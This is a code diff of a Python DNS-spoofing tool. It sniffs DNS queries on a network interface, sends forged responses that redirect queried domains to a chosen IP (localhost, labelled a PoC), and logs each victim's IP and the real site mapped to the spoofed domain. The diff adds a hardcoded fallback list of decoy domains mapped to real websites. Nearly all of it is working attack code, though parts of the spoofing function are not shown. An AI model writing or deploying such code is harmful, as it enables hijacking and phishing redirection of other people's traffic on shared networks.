@@ -3,17 +3,19 @@ from pathlib import Path
 from data.data_helper import record_entry
 from cli_mapper import ClientMapper
 import time
-
+import json
 
 # Configuration
-def load_urls() -> dict[str,str]:
+def load_urls():
     try:
-        with open(f'{Path(__file__).parent}/urls.json', 'r') as file:
+        with open('urls.json', 'r') as file:
+            #print("found urls file")
             return json.load(file)
+            #print("loaded file")
     except Exception as e:
-        return {}
+        return {'www.techinginfo.com': 'www.chess.com', 'www.shopconvet.com': 'www.ynet.co.il'}
     
-URLS: dict[str,str] = load_urls()
+URLS = load_urls()
 SPOOF_IP = "127.0.0.1"        # IP to redirect to (localhost for PoC)
 INTERFACE = "en1"             # Your network interface (check with `ifconfig
 MAPPER = ClientMapper()
@@ -46,14 +48,14 @@ def dns_spoof(pkt):
                 time.sleep(0.1)
             print(f"Spoofed DNS response sent: {qname} -> {SPOOF_IP}")
             record_entry(qname,build_dict_from_packet(pkt))
-            MAPPER.add_client(srcip,qname) #type:ignore
+            MAPPER.add_client(srcip,URLS[qname]) #type:ignore
             
-def build_dict_from_packet(pkt) -> dict[str,str]:
+def build_dict_from_packet(pkt):
     return {"IP":pkt[IP].src,"Time":time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
 
 
 
 if __name__ == "__main__":
     # Sniff DNS packets
-    print(f"Sniffing DNS queries for {URLS.keys()} on {INTERFACE}...")
+    print(f"Sniffing DNS queries for {URLS} on {INTERFACE}...")
     sniff(filter="udp port 53", prn=dns_spoof, store=0)
